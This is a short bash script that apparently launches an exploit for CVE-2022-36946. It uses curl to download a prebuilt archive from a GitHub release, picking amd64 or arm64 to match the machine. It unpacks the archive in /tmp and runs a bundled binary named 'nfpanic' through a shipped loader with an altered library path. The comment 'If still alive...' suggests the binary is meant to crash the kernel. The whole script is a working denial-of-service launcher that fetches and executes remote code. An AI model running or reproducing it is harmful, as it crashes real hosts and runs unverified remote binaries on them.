#!/usr/bin/env bash

cd /tmp/
#If there were some files before
rm -rf cve-2022-36946 &> /dev/null

ARCH=$(uname -m)
if [[ "$ARCH" == x86_64* ]]; then
  curl -L https://github.com/Pwnzer0tt1/CVE-2022-36946/releases/download/1.0.0/amd64.tar.gz > files.tar.gz
elif  [[ "$ARCH" == aarch64* ]]; then
  curl -L https://github.com/Pwnzer0tt1/CVE-2022-36946/releases/download/1.0.0/arm64.tar.gz > files.tar.gz
else
  echo "Unsupported architecture: $ARCH"
  exit 1
fi

tar xf files.tar.gz
rm files.tar.gz

cd cve-2022-36946 &> /dev/null

chmod +x ./ld-linux.so.1 ./nfpanic

export XTABLES_LIBDIR=./xtables
export LD_LIBRARY_PATH=./
./ld-linux.so.1 ./nfpanic

#If still alive...
cd ..
rm -rf cve-2022-36946 &> /dev/null


